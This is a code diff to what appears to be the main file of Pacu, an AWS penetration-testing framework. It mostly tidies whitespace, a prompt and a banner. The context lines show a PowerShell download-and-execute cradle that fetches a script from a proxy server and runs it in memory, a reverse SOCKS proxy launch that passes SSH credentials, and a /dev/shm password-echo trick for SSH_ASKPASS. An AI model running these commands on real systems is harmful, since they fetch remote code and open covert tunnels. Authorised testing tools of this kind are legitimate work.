@@ -605,7 +605,6 @@ class Main:
         proxy_ssh_username = proxy_settings.ssh_username
         proxy_ssh_password = proxy_settings.ssh_password
         proxy_target_agent = copy.deepcopy(proxy_settings.target_agent)
-        
 
         if len(command) == 1 or (len(command) == 2 and command[1] == 'help'):  # Display proxy help
             self.display_proxy_help()
@@ -771,10 +770,10 @@ class Main:
 
                             # Download the script from the PacuProxy server
                             downloaded_string = "(New-Object System.Net.WebClient).DownloadString('http://{}:5051/{}')".format(proxy_ip, secret_string)
-                            
+
                             # Run Invoke-Expression on the downloaded script to import it to memory
                             invoke_expression = 'powershell iex({})'.format(downloaded_string)
-                            
+
                             # Execute the newly imported script to start the reverse proxy
                             start_proxy_cmd = 'Start-SocksProxy -sshhost {} -username {} -password {} -RemotePort 8001 -LocalPort 5050'.format(proxy_ip, proxy_ssh_username, proxy_ssh_password)
 
@@ -783,13 +782,13 @@ class Main:
                         else:
                             if shm_name == '':
                                 shm_name = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=5))
-                            
+
                             # Create an in-memory file in /dev/shm that contains the password
                             create_shm = 'echo "echo {}" > /dev/shm/{}'.format(shm_name)
-                            
+
                             # Give the file 777 permissions
                             add_permissions = 'chmod 777 /dev/shm/{}'.format(shm_name)
-                            
+
                             # DISPLAY=dummy to emulate a display
                             # SSH_ASKPASS=/dev/shm/{} to tell SSH that the file will echo it a password
                             # setsid to avoid any prompts
@@ -973,12 +972,11 @@ class Main:
         print('Automatically targeting region(s):')
         for region in self.get_regions('all'):
             print('  {}'.format(region))
-        response = input('Do you wish to continue? (y/n)')
+        response = input('Continue? (y/n) ')
         if response.lower() == 'y':
             return True
         else:
             return False
-
 
     ###### Some module notes
     # For any argument that needs a value and a region for that value, use the form
@@ -1550,7 +1548,8 @@ class Main:
         while True:
             try:
                 if not idle_ready:
-                    print("""
+                    try:
+                        print("""
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡿⠛⠉⠁⠀⠀⠈⠙⠻⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -1576,6 +1575,9 @@ class Main:
  ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⡟
  ⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠃⠀⠀⠘⠛⠛⠃⠀⠀⠉⠛⠛⠛⠛⠛⠛⠋⠀⠀⠀⠀⠙⠛⠛⠛⠛⠛⠉⠀
 """)
+                    except UnicodeEncodeError as error:
+                        pass
+
 
                     configure_settings.copy_settings_template_into_settings_file_if_not_present()
                     set_sigint_handler(exit_text='\nA database must be created for Pacu to work properly.')
